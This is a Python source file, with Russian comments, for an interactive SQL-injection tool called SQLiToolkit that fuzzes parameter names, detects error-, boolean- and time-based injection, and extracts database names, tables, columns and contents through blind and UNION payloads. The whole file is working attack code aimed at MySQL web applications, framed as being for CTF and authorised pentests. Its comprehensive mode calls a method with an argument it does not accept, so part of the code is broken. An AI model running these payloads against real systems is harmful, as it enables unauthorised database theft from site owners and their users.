"""
=============================================================================
 test.py — SQLiToolkit: комплексный инструмент тестирования SQL-инъекций
=============================================================================

ЗАЧЕМ:
    Самый функциональный скрипт набора (ООП-класс SQLiToolkit). Объединяет
    весь пайплайн в одном интерактивном меню:
      • fuzz_parameters()   — многопоточный (ThreadPoolExecutor) перебор имён
        параметров (id, user, search, ...) для поиска уязвимого, GET и POST;
      • detect_injection()  — определение факта инъекции (error / boolean /
        time-based) и рабочего метода (GET/POST);
      • boolean/time/union_based_extraction() — извлечение имени БД, таблиц,
        колонок, данных (GROUP_CONCAT), либо произвольный пользовательский SQL;
      • detect_union_columns() — подбор числа колонок через ORDER BY;
      • comprehensive_test()— полный автопроход boolean → time → union.

ГДЕ ПРИМЕНИМО:
    Универсальная «швейцарский нож» замена частным скриптам набора, когда
    заранее неизвестны параметр, метод и структура. Учебные стенды/CTF, а
    также авторизованный ручной pentest веб-приложений (MySQL).

ЗАПУСК:
    python3 test.py  → ввести URL, выбрать тип атаки в меню.

ОГРАНИЧЕНИЯ / ЗАМЕЧАНИЯ:
    - Индикаторы успеха ("welcome", "under consideration", "error") подобраны
      эвристически — под конкретное приложение может потребоваться правка.
    - Многопоточный фаззинг шумный: снизьте max_workers для «тихого» режима.
    - Только для авторизованного тестирования / CTF.
=============================================================================
"""
import requests
import time
import string
from enum import Enum
from concurrent.futures import ThreadPoolExecutor
import sys

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

class AttackType(Enum):
    BOOLEAN = 1
    TIME_BASED = 2
    UNION = 3
    COMPREHENSIVE = 4

class SQLiToolkit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
            "Accept-Language": "en-US,en;q=0.5",
            "Upgrade-Insecure-Requests": "1",
            "Priority": "u=0, i"
        }
        self.param_wordlist = [
            'id', 'user', 'name', 'query', 'search', 'category', 'product', 
            'page', 'view', 'file', 'order', 'sort', 'filter', 'login', 'username',
            'password', 'email', 'phone', 'date', 'year', 'month', 'day'
        ]
    
    def fuzz_parameters(self):
        """Фаззинг параметров для поиска уязвимых"""
        print(f"{Colors.OKCYAN}[*] Начинаем фаззинг параметров...{Colors.ENDC}")
        
        vulnerable_params = []
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for param in self.param_wordlist:
                futures.append(executor.submit(self.test_parameter, param))
            
            for future in futures:
                result = future.result()
                if result:
                    vulnerable_params.append(result)
        
        if not vulnerable_params:
            print(f"{Colors.FAIL}[-] Не найдено уязвимых параметров{Colors.ENDC}")
            return None
        
        print(f"\n{Colors.OKGREEN}[+] Найдены потенциально уязвимые параметры:{Colors.ENDC}")
        for i, param in enumerate(vulnerable_params, 1):
            print(f"{i}. {param}")
        
        if len(vulnerable_params) == 1:
            return vulnerable_params[0]
        
        choice = input("\nВыберите параметр для тестирования (номер): ")
        try:
            return vulnerable_params[int(choice)-1]
        except:
            return vulnerable_params[0]
    
    def test_parameter(self, param):
        """Тестирование одного параметра на уязвимость"""
        test_payloads = [
            ("'", "SQL syntax"),
            ("' OR '1'='1", "welcome"),
            ("' AND 1=1--", "error"),
            ("' AND 1=0--", "error")
        ]
        
        # Пробуем GET параметры
        try:
            for payload, indicator in test_payloads:
                url = f"{self.target_url}?{param}={payload}"
                response = self.session.get(url, headers=self.headers, timeout=5)
                
                if "error" in response.text.lower() or indicator.lower() in response.text.lower():
                    print(f"{Colors.OKGREEN}[+] Найден потенциально уязвимый GET параметр: {param}{Colors.ENDC}")
                    return param
        except:
            pass
        
        # Пробуем POST параметры
        try:
            for payload, indicator in test_payloads:
                data = {param: payload}
                response = self.session.post(self.target_url, data=data, headers=self.headers, timeout=5)
                
                if "error" in response.text.lower() or indicator.lower() in response.text.lower():
                    print(f"{Colors.OKGREEN}[+] Найден потенциально уязвимый POST параметр: {param}{Colors.ENDC}")
                    return param
        except:
            pass
        
        return None
    
    def detect_injection(self, param_name):
        """Обнаружение уязвимости к SQL-инъекциям"""
        test_payloads = [
            ("'", "SQL syntax error"),
            ("' OR '1'='1", "welcome"),
            ("' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--", "conversion")
        ]
        
        for payload, indicator in test_payloads:
            # Пробуем GET
            try:
                url = f"{self.target_url}?{param_name}={payload}"
                response = self.session.get(url, headers=self.headers, timeout=5)
                
                if indicator in response.text.lower():
                    return True, "GET"
            except:
                pass
            
            # Пробуем POST
            try:
                data = {param_name: payload}
                response = self.session.post(self.target_url, data=data, headers=self.headers, timeout=5)
                
                if indicator in response.text.lower():
                    return True, "POST"
            except:
                pass
            
            # Проверка временной задержки для слепых инъекций
            try:
                start_time = time.time()
                data = {param_name: f"' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(5)--"}
                response = self.session.post(self.target_url, data=data, headers=self.headers, timeout=10)
                if time.time() - start_time > 5:
                    return True, "POST (time-based)"
            except requests.exceptions.Timeout:
                return True, "POST (time-based)"
            except:
                pass
        
        return False, None
    
    def extract_data(self, attack_type, param_name=None, method="GET"):
        """Основная функция для извлечения данных"""
        if not param_name:
            param_name = self.fuzz_parameters()
            if not param_name:
                return
        
        is_vulnerable, detected_method = self.detect_injection(param_name)
        if not is_vulnerable:
            print(f"{Colors.FAIL}[-] Уязвимость не обнаружена в параметре {param_name}{Colors.ENDC}")
            return
        
        method = detected_method or method
        print(f"{Colors.OKGREEN}[+] Уязвимость обнаружена! Метод: {method}, параметр: {param_name}{Colors.ENDC}")
        
        if attack_type == AttackType.BOOLEAN:
            self.boolean_based_extraction(param_name, method)
        elif attack_type == AttackType.TIME_BASED:
            self.time_based_extraction(param_name, method)
        elif attack_type == AttackType.UNION:
            self.union_based_extraction(param_name, method)
        elif attack_type == AttackType.COMPREHENSIVE:
            self.comprehensive_test(param_name, method)
    
    def boolean_based_extraction(self, param_name, method="GET"):
        """Boolean-based слепая SQL-инъекция"""
        print("\nВыберите цель:")
        print("1. Имя текущей базы данных")
        print("2. Список таблиц")
        print("3. Список колонок")
        print("4. Пользовательский запрос")
        choice = input("> ")
        
        if choice == "1":
            query = "SELECT database()"
        elif choice == "2":
            query = "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"
        elif choice == "3":
            table = input("Введите имя таблицы: ")
            query = f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}'"
        else:
            query = input("Введите SQL запрос (результат должен быть одной строкой): ")
        
        result = self._blind_extract(param_name, method, query)
        print(f"\n{Colors.OKGREEN}[+] Извлечение завершено: {result}{Colors.ENDC}")
        return result
    
    def time_based_extraction(self, param_name, method="GET"):
        """Time-based слепая SQL-инъекция"""
        print("\nВыберите цель:")
        print("1. Имя текущей базы данных")
        print("2. Список таблиц")
        print("3. Список колонок")
        print("4. Пользовательский запрос")
        choice = input("> ")
        
        if choice == "1":
            query = "SELECT database()"
        elif choice == "2":
            query = "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"
        elif choice == "3":
            table = input("Введите имя таблицы: ")
            query = f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}'"
        else:
            query = input("Введите SQL запрос (результат должен быть одной строкой): ")
        
        result = self._time_extract(param_name, method, query)
        print(f"\n{Colors.OKGREEN}[+] Извлечение завершено: {result}{Colors.ENDC}")
        return result
    
    def union_based_extraction(self, param_name, method="GET"):
        """Union-based SQL-инъекция"""
        print(f"{Colors.WARNING}[!] Union-based атака требует знания количества колонок{Colors.ENDC}")
        num_columns = self.detect_union_columns(param_name, method)
        
        if not num_columns:
            print(f"{Colors.FAIL}[-] Не удалось определить количество колонок{Colors.ENDC}")
            return
        
        print(f"{Colors.OKGREEN}[+] Количество колонок: {num_columns}{Colors.ENDC}")
        
        query = input("Введите SQL запрос для UNION атаки (например: 1,2,3,version(),database()): ")
        
        if method.upper() == "GET":
            url = f"{self.target_url}?{param_name}=' UNION SELECT {query}-- -"
            response = self.session.get(url, headers=self.headers)
        else:
            data = {param_name: f"' UNION SELECT {query}-- -"}
            response = self.session.post(self.target_url, data=data, headers=self.headers)
        
        print(f"\n{Colors.OKCYAN}[+] Ответ сервера:{Colors.ENDC}")
        print(response.text)
    
    def detect_union_columns(self, param_name, method="GET"):
        """Определение количества колонок для UNION-атаки"""
        for i in range(1, 20):
            if method.upper() == "GET":
                url = f"{self.target_url}?{param_name}=' ORDER BY {i}-- -"
                response = self.session.get(url, headers=self.headers)
            else:
                data = {param_name: f"' ORDER BY {i}-- -"}
                response = self.session.post(self.target_url, data=data, headers=self.headers)
            
            if "error" in response.text.lower() or "syntax" in response.text.lower():
                return i - 1
        
        return None
    
    def comprehensive_test(self, param_name, method="GET"):
        """Комплексное тестирование"""
        print(f"\n{Colors.HEADER}[*] Начинаем комплексное тестирование{Colors.ENDC}")
        
        # 1. Boolean-based
        print(f"\n{Colors.BOLD}[*] Тестирование Boolean-based атаки{Colors.ENDC}")
        db_name = self.boolean_based_extraction(param_name, method)
        
        if db_name:
            tables = self.boolean_based_extraction(param_name, method, 
                f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db_name}'")
            
            if tables:
                for table in tables.split(','):
                    columns = self.boolean_based_extraction(param_name, method,
                        f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table}'")
                    
                    if columns:
                        for column in columns.split(','):
                            data = self.boolean_based_extraction(param_name, method,
                                f"SELECT GROUP_CONCAT({column}) FROM {table}")
                            print(f"{Colors.OKBLUE}[+] Данные из {table}.{column}: {data}{Colors.ENDC}")
        
        # 2. Time-based
        print(f"\n{Colors.BOLD}[*] Тестирование Time-based атаки{Colors.ENDC}")
        self.time_based_extraction(param_name, method)
        
        # 3. Union-based
        print(f"\n{Colors.BOLD}[*] Тестирование Union-based атаки{Colors.ENDC}")
        self.union_based_extraction(param_name, method)
    
    def _blind_extract(self, param_name, method, query):
        """Общая функция для boolean-based извлечения"""
        result = ""
        pos = 1
        
        while True:
            found = False
            for char in string.ascii_letters + string.digits + "_@.- ":
                payload = f"' OR SUBSTRING(({query}),{pos},1)='{char}'-- -"
                
                if method.upper() == "GET":
                    url = f"{self.target_url}?{param_name}={payload}"
                    response = self.session.get(url, headers=self.headers)
                else:
                    data = {param_name: payload}
                    response = self.session.post(self.target_url, data=data, headers=self.headers)
                
                if "welcome" in response.text.lower() or "under consideration" in response.text.lower():
                    result += char
                    print(f"\r[+] Результат: {result}", end="", flush=True)
                    found = True
                    break
            
            if not found:
                break
                
            pos += 1
        
        return result
    
    def _time_extract(self, param_name, method, query):
        """Общая функция для time-based извлечения"""
        result = ""
        pos = 1
        
        while True:
            found = False
            for char in string.ascii_letters + string.digits + "_@.- ":
                payload = f"' AND IF(SUBSTRING(({query}),{pos},1)='{char}',SLEEP(5),0)-- -"
                
                start_time = time.time()
                if method.upper() == "GET":
                    url = f"{self.target_url}?{param_name}={payload}"
                    try:
                        response = self.session.get(url, headers=self.headers, timeout=10)
                    except requests.exceptions.Timeout:
                        result += char
                        print(f"\r[+] Результат: {result}", end="", flush=True)
                        found = True
                        break
                else:
                    data = {param_name: payload}
                    try:
                        response = self.session.post(self.target_url, data=data, headers=self.headers, timeout=10)
                    except requests.exceptions.Timeout:
                        result += char
                        print(f"\r[+] Результат: {result}", end="", flush=True)
                        found = True
                        break
                
                elapsed = time.time() - start_time
                if elapsed >= 5:
                    result += char
                    print(f"\r[+] Результат: {result}", end="", flush=True)
                    found = True
                    break
            
            if not found:
                break
                
            pos += 1
        
        return result

def show_banner():
    banner = f"""
{Colors.OKCYAN} 
 _______         _______  _______  _        _______  _______  _______ 
(  ____ \       (  ____ \(  ___  )( \      (       )(  ___  )(  ____ )
| (    \/       | (    \/| (   ) || (      | () () || (   ) || (    )|
| (__           | (_____ | |   | || |      | || || || (___) || (____)|
|  __)          (_____  )| |   | || |      | |(_)| ||  ___  ||  _____)
| (                   ) || | /\| || |      | |   | || (   ) || (      
| )             /\____) || (_\ \ || (____/\| )   ( || )   ( || )      
|/        _____ \_______)(____\/_)(_______/|/     \||/     \||/       
         (_____)         
{Colors.ENDC}
{Colors.BOLD}SQLi Toolkit - универсальный инструмент для тестирования SQL-инъекций{Colors.ENDC}
"""
    print(banner)

def main():
    show_banner()
    
    target_url = input("Введите URL для тестирования: ").strip()
    if not target_url.startswith("http"):
        target_url = "http://" + target_url
    
    toolkit = SQLiToolkit(target_url)
    
    print("\nВыберите тип атаки:")
    print("1. Boolean-based слепая SQLi")
    print("2. Time-based слепая SQLi")
    print("3. Union-based SQLi")
    print("4. Комплексное тестирование")
    
    choice = input("> ")
    
    if choice == "1":
        toolkit.extract_data(AttackType.BOOLEAN)
    elif choice == "2":
        toolkit.extract_data(AttackType.TIME_BASED)
    elif choice == "3":
        toolkit.extract_data(AttackType.UNION)
    elif choice == "4":
        toolkit.extract_data(AttackType.COMPREHENSIVE)
    else:
        print(f"{Colors.FAIL}[-] Неверный выбор{Colors.ENDC}")

if __name__ == "__main__":
    main()
